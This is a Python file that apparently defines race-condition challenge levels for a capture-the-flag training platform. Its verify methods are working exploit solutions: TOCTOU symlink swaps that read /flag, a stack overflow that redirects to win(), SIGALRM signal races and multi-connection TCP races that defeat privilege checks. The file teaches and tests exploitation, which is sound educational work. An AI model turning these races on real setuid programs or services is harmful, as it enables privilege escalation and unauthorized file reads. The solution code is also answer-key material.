import tempfile
import pwnshop
import signal
import time
import pwn
import os

from pwnshop import Challenge

PWNSHOP_AUTOREGISTER = False


class BabyRaceBase(Challenge):
    TEMPLATE_PATH = "babyrace/babyrace.c"

    check_directory = None
    read_buffer_size = 256
    max_size = None

    def workpath(self, f):
        return self.work_dir + "/root/" + f

    def verify_path_constraints(self, **kwargs):
        os.makedirs(self.workpath(""), exist_ok=True)
        kwargs["close_stdin"] = True
        with self.run_challenge(**kwargs, cmd_args=["/flag"]) as process:
            assert b"Error: path contains `flag`!" in process.readall()
        with self.run_challenge(**kwargs, cmd_args=[self.workpath("/a")], flag_symlink=self.workpath("/a")) as process:
            assert b"Error: file is a symlink!" in process.readall()

        if self.check_directory:
            os.mkdir(self.workpath("/a"))
            os.close(os.open(self.workpath("/a/a"), os.O_CREAT))
            os.chown(self.workpath("/a"), 1, 0)
            with self.run_challenge(**kwargs, cmd_args=[self.workpath("/a/a")]) as process:
                assert b"Error: directory not owned by root!" in process.readall()
            os.chown(self.workpath("/a"), 0, 1)
            with self.run_challenge(**kwargs, cmd_args=[self.workpath("/a/a")]) as process:
                assert b"Error: directory not group owned by root!" in process.readall()
            os.chown(self.workpath("/a"), 0, 0)
            os.chmod(self.workpath("/a"), 0o777)
            with self.run_challenge(**kwargs, cmd_args=[self.workpath("/a/a")]) as process:
                assert (
                    b"Error: other users are able to write in this directory!"
                    in process.readall()
                )
            os.unlink(self.workpath("/a/a"))
            os.rmdir(self.workpath("/a"))

        if self.max_size:
            if os.path.exists(self.workpath("/a")):
                os.unlink(self.workpath("/a"))
            with open(self.workpath("/a"), "w") as f:
                f.write("a" * (self.max_size + 1))
            with self.run_challenge(**kwargs, cmd_args=[self.workpath("/a")]) as process:
                assert b"Error: file is too large!" in process.readall()
            os.unlink(self.workpath("/a"))


class BabyRaceBasicTOCTOU(BabyRaceBase):
    """
    Exploit a basic race condition to get the flag.
    """

    sendfile = True
    sleep = 10 * 1000  # 10ms

    def verify(self, **kwargs):
        """
        Basic TOCTOU exploit. Challenge lstat()s argv1 path, sleeps for 10ms, then opens/reads/writes argv1 path
        """
        kwargs["close_stdin"] = True
        self.verify_path_constraints(**kwargs)

        for _ in range(4096):
            try:
                with open(self.workpath("/a"), "w"):
                    pass
                with self.run_challenge(**kwargs, cmd_args=[self.workpath("/a")]) as process:
                    os.unlink(self.workpath("/a"))
                    os.symlink(self.workpath("/flag"), self.workpath("/a"))
                    if self.flag in process.readall():
                        break
            finally:
                os.unlink(self.workpath("/a"))
        else:
            assert False


class BabyRaceBasicTOCTOUNoSleep(BabyRaceBase):
    """
    Exploit a race condition with a tighter timing window to read the flag.
    Keep in mind that tighter timing windows in race conditions generally are harder to exploit reliably!
    """

    sendfile = True

    def verify(self, **kwargs):
        """
        Another basic TOCTOU exploit. Lstat()s and checks for symlinks before open/read/write, no sleeping.
        """
        kwargs["close_stdin"] = True
        self.verify_path_constraints(**kwargs)

        pid = os.fork()
        if not pid:
            while True:
                os.close(os.open(self.workpath("/a"), os.O_CREAT))
                os.unlink(self.workpath("/a"))
                os.symlink(self.workpath("/flag"), self.workpath("/a"))
                os.unlink(self.workpath("/a"))

        try:
            for _ in range(4096):
                with self.run_challenge(**kwargs, cmd_args=[self.workpath("/a")]) as process:
                    if self.flag in process.readall():
                        break
            else:
                assert False
        finally:
            os.kill(pid, signal.SIGSTOP)
            try:
                os.unlink(self.workpath("/a"))
            except FileNotFoundError:
                pass


class BabyRaceTOCTOUWinVariable(BabyRaceBase):
    """
    Exploit a race condtion to corrupt memory, affecting the behavior of the challenge.
    """

    read = True
    read_size = 0x1000
    max_size = 256
    win_function = True
    win_variable = True

    def verify(self, **kwargs):
        """
        More TOCTOU, this time we check the file size in addition to lstat/ISLNK to assure they wont overrun the buffer, but use a race condition to do so and clobber a win variable.
        """
        kwargs["close_stdin"] = True
        self.verify_path_constraints(**kwargs)

        pid = os.fork()
        if not pid:
            while True:
                fd = os.open(self.workpath("/a"), os.O_CREAT | os.O_WRONLY)
                os.write(fd, b"a" * self.read_size)
                os.close(fd)
                os.unlink(self.workpath("/a"))

        try:
            for _ in range(4096):
                with self.run_challenge(**kwargs, cmd_args=[self.workpath("/a")]) as process:
                    if self.flag in process.readall():
                        break
            else:
                assert False
        finally:
            os.kill(pid, signal.SIGSTOP)
            try:
                os.unlink(self.workpath("/a"))
            except FileNotFoundError:
                pass


class BabyRaceTOCTOUBufferOverflow(BabyRaceBase):
    """
    Exploit a race condition to corrupt memory and smash the stack!
    """

    PIE = False
    CANARY = False

    read = True
    read_size = 0x1000
    max_size = 256
    win_function = True

    def verify(self, **kwargs):
        """
        Use TOCTOU to overwrite the return address of the function and jump to win().
        """
        kwargs["close_stdin"] = True
        self.verify_path_constraints(**kwargs)

        win_addr = pwn.ELF(self.bin_path).symbols["win"]

        pid = os.fork()
        if not pid:
            while True:
                fd = os.open(self.workpath("/a"), os.O_CREAT | os.O_WRONLY)
                os.write(fd, pwn.p64(win_addr) * (self.read_size // 8))
                os.close(fd)
                os.unlink(self.workpath("/a"))

        try:
            for _ in range(4096):
                with self.run_challenge(**kwargs, cmd_args=[self.workpath("/a")]) as process:
                    if self.flag in process.readall():
                        break
            else:
                assert False
        finally:
            os.kill(pid, signal.SIGSTOP)
            try:
                os.unlink(self.workpath("/a"))
            except FileNotFoundError:
                pass


class BabyRaceComplexTOCTOUstat(BabyRaceBase):
    """
    Exploit a complex race condition to read the flag.
    This race condition involves multiple steps, which makes it less reliable to exploit!
    """

    sendfile = True
    check_directory_stat = True

    def verify(self, **kwargs):
        """
        Basically we put a number of conditions on the path that we need to pass:
        1. can't contain "flag"
        2. lstat
        3. S_ISLNK
        4. stat() the directory, must be owned/group owned by root (uid/gid)
        5. S_IWOTH bit (writable by other users) must not be set
        --
        init: mkdir /home/hacker/b and touch /home/hacker/b/a
        (launch program with argv1 '/home/hacker/a/a')
        Then we race:
        1. link /home/hacker/a to /home/hacker/b
        2. link /home/hacker/a to / (to pass uid/gid checks)
        3. link /home/hacker/a to /home/hacker/b
        4. link /home/hacker/b/a to /flag
        """
        # TODO: permissions of this verify environment do not follow suid, this is a massive issue to verify this
        self.verify_path_constraints(**kwargs)

        def initialize():
            os.mkdir(self.workpath("/home/hacker/b"))

        def step_1():
            # /home/hacker/a/a -> /home/hacker/b/a
            os.close(os.open(self.workpath("/home/hacker/b/a"), os.O_CREAT | os.O_WRONLY))
            os.symlink(self.workpath("/home/hacker/b"), self.workpath("/home/hacker/a"))

        def step_2():
            # /home/hacker/a/a -> /a
            os.unlink(self.workpath("/home/hacker/a"))
            os.symlink(self.workpath("/"), self.workpath("/home/hacker/a"))

        def step_3():
            # /home/hacker/a/a -> /home/hacker/b/a -> /flag
            os.unlink(self.workpath("/home/hacker/a"))
            os.symlink(self.workpath("/home/hacker/b"), self.workpath("/home/hacker/a"))
            os.unlink(self.workpath("/home/hacker/b/a"))
            os.symlink(self.workpath("/flag"), self.workpath("/home/hacker/b/a"))

        def cleanup():
            os.unlink(self.workpath("/home/hacker/b/a"))
            os.unlink(self.workpath("/home/hacker/a"))

        # def initialize():
        #     os.mkdir(self.workpath("/home/hacker/b"))
        #     os.open(self.workpath("/home/hacker/b/a"), os.O_CREAT | os.O_WRONLY)
        #     os.mkdir(self.workpath("/home/hacker/c"))
        #     os.symlink(self.workpath("/flag"), self.workpath("/home/hacker/c/a"))
        #     os.symlink(self.workpath("/home/hacker/b"), self.workpath("/home/hacker/a"))

        # def step_1():
        #     os.unlink(self.workpath("/home/hacker/a"))
        #     os.symlink(self.workpath("/home/hacker/b"), self.workpath("/home/hacker/a"))

        # def step_2():
        #     os.unlink(self.workpath("/home/hacker/a"))
        #     os.symlink(self.workpath("/"), self.workpath("/home/hacker/a"))

        # def step_3():
        #     os.unlink(self.workpath("/home/hacker/a"))
        #     os.symlink(self.workpath("/home/hacker/c"), self.workpath("/home/hacker/a"))

        # def cleanup():
        #     pass

        steps = [step_1, step_2, step_3]

        if not self.walkthrough:
            pid = os.fork()
            if not pid:
                initialize()
                while True:
                    for step in steps:
                        step()
                    cleanup()

        iterations = 1 if self.walkthrough else 4096
        try:
            for i in range(iterations):
                print(i)
                with self.run_challenge(**kwargs, cmd_args=[self.workpath("/home/hacker/a/a")]) as process:
                    if self.walkthrough:
                        initialize()
                        for step in steps:
                            process.readuntil("Paused (press enter to continue)")
                            step()
                            process.send("\n")
                    if self.flag in process.readall():
                        break
            else:
                assert False
        finally:
            if not self.walkthrough:
                os.kill(pid, signal.SIGSTOP)


class BabyRaceComplexTOCTOUlstat(BabyRaceBase):
    """
    Exploit a complex race condition to read the flag.
    This race condition involves multiple steps, which makes it less reliable to exploit!
    """

    sendfile = True
    check_directory_lstat = True

    def verify(self, **kwargs):
        """
        This is the same as the previous level, but instead we lstat() the directory instead of stat(), which changes the steps required.
        """

        # TODO: permissions of this verify environment do not follow suid, this is a massive issue to verify this
        # TODO: currently only verifies for walkthrough
        if not self.walkthrough:
            self.verify_path_constraints(**kwargs)

        os.makedirs(self.workpath("/home/hacker"), exist_ok=True)
        def step_1():
            # /home/hacker/a/root/a
            os.mkdir(self.workpath("/home/hacker/a"))
            os.mkdir(self.workpath("/home/hacker/a/root"))
            os.close(os.open(self.workpath("/home/hacker/a/root/a"), os.O_CREAT | os.O_WRONLY))

        def step_2():
            # /home/hacker/a/root/a -> /root/a
            os.unlink(self.workpath("/home/hacker/a/root/a"))
            os.rmdir(self.workpath("/home/hacker/a/root"))
            os.rmdir(self.workpath("/home/hacker/a"))
            os.symlink(self.workpath("/"), self.workpath("/home/hacker/a"))

        def step_3():
            # /home/hacker/a/root/a -> /flag
            os.unlink(self.workpath("/home/hacker/a"))
            os.mkdir(self.workpath("/home/hacker/a"))
            os.mkdir(self.workpath("/home/hacker/a/root"))
            os.symlink(self.workpath("/flag"), self.workpath("/home/hacker/a/root/a"))

        def cleanup():
            os.unlink(self.workpath("/home/hacker/a/root/a"))
            os.rmdir(self.workpath("/home/hacker/a/root"))
            os.rmdir(self.workpath("/home/hacker/a"))

        steps = [step_1, step_2, step_3]

        if not self.walkthrough:
            pid = os.fork()
            if not pid:
                if os.geteuid() == 0:
                    os.setegid(1000)
                    os.seteuid(1000)
                while True:
                    for step in steps:
                        step()
                    cleanup()

        iterations = 1 if self.walkthrough else 32768
        try:
            for _ in range(iterations):
                with self.run_challenge(
                    **kwargs, cmd_args=[self.workpath("/home/hacker/a/root/a")]
                ) as process:
                    if self.walkthrough:
                        for step in steps:
                            process.readuntil("Paused (press enter to continue)")
                            print(step)
                            step()
                            process.send("\n")

                    if self.flag in process.readall():
                        break
            else:
                assert False
        finally:
            if not self.walkthrough:
                os.kill(pid, signal.SIGSTOP)


class BabyRaceAccountBase(Challenge):
    TEMPLATE_PATH = "babyrace/babyrace_account.c"


class BabyRaceLoginBase(BabyRaceAccountBase):
    win_function = True
    login = True


class BabyRaceSignalRace(BabyRaceLoginBase):
    """
    Exploit a race condition in a more realistic scenario to affect program behavior.
    """

    signal = True

    def verify(self, **kwargs):
        """
        This challenge has a timeout handler triggered upon SIGALRM which can be used to bypass privilege level checks.
        All we have to do is repeatedly send SIGALRM to set our privelege level to 0 when we are actively dropping one privilege level, giving us -1.
        """
        with self.run_challenge(**kwargs) as process:
            pid = os.fork()
            if not pid:
                while True:
                    os.kill(process.pid, signal.SIGALRM)
                    time.sleep(0.1)

            while True:
                if not self.walkthrough:
                    cmd = "login logout win_authed\n"
                else:
                    cmd = "login . logout . win_authed\n"
                process.send(cmd * 1000)
                if self.flag in process.clean():
                    break

            process.sendline("quit")
            os.kill(pid, signal.SIGSTOP)


class BabyRaceTCPRace(BabyRaceLoginBase):
    """
    Utilize multiple connections to the same program to trigger a race condition, affecting program behavior!
    """

    LINK_LIBRARIES = ["pthread"]

    threaded_server = True

    def verify(self, **kwargs):
        """
        Utilize multiple connections to race, goal is to trigger two logouts at the same time to get privilege level < 0.
        """
        with self.run_challenge(**kwargs):
            pids = []
            pids.append(os.fork())
            if not pids[-1]:
                r = pwn.remote("localhost", 1337)
                while True:
                    r.sendline("login " * 1000)
                    r.clean()
            for _ in range(2):
                pids.append(os.fork())
                if not pids[-1]:
                    r = pwn.remote("localhost", 1337)
                    while True:
                        r.sendline("logout " * 1000)
                        r.clean()

            r = pwn.remote("localhost", 1337)
            while True:
                r.sendline("win_authed " * 1000)
                if self.flag in r.clean():
                    break
            for p in pids:
                os.kill(p, signal.SIGSTOP)
            r.sendline("quit")


class BabyRaceMessageBase(BabyRaceAccountBase):
    LINK_LIBRARIES = ["pthread"]

    threaded_server = True

    message = True
    verify_message_solution = None

    def verify(self, **kwargs):
        """
        send_redacted_flag is off by 1, so a nullbyte exists between "REDACTED: " and the flag, requiring a race condition to get past this limitation.
        """
        with self.run_challenge(**kwargs):
            pids = []
            pids.append(os.fork())
            if not pids[-1]:
                r = pwn.remote("localhost", 1337)
                while True:
                    r.sendline("send_redacted_flag " * 1000)
                    r.clean()
            for _ in range(2):
                pids.append(os.fork())
                if not pids[-1]:
                    r = pwn.remote("localhost", 1337)
                    while True:
                        r.sendline(
                            f"send_message {self.verify_message_solution} " * 1000
                        )
                        r.clean()

            r = pwn.remote("localhost", 1337)
            while True:
                r.sendline("receive_message " * 1000)
                if self.flag in r.clean():
                    break
            for p in pids:
                os.kill(p, signal.SIGSTOP)
            r.sendline("quit")


class BabyRaceMessageRace(BabyRaceMessageBase):
    """
    Utilize a race condition to leak information out of a program.
    """

    verify_message_solution = "A" * (len("REDACTED: ") + 1)


class BabyRaceMessageRaceMutex(BabyRaceMessageBase):
    """
    Utilize a race condition to leak information out of a program, but with additional difficulty, making the race harder!
    """

    atomic_broadcast = True

    verify_message_solution = "A" * 100


class BabyRaceMessageRaceMutexPrintf(BabyRaceMessageBase):
    """
    Utilize a race condition to leak information out of a program, but with *even more* additional difficulty, making the race *even* harder!
    """

    atomic_broadcast = True
    receive_printf = True

    verify_message_solution = "A" * 100


LEVELS = [
    BabyRaceBasicTOCTOU,
    BabyRaceBasicTOCTOUNoSleep,
    BabyRaceTOCTOUWinVariable,
    BabyRaceTOCTOUBufferOverflow,
    BabyRaceComplexTOCTOUlstat,
    BabyRaceComplexTOCTOUstat,
    BabyRaceSignalRace,
    BabyRaceTCPRace,
    BabyRaceMessageRace,
    BabyRaceMessageRaceMutex,
    BabyRaceMessageRaceMutexPrintf,
]
NUM_TESTING = 1
DOJO_MODULE = "race"

pwnshop.register_challenges(LEVELS)
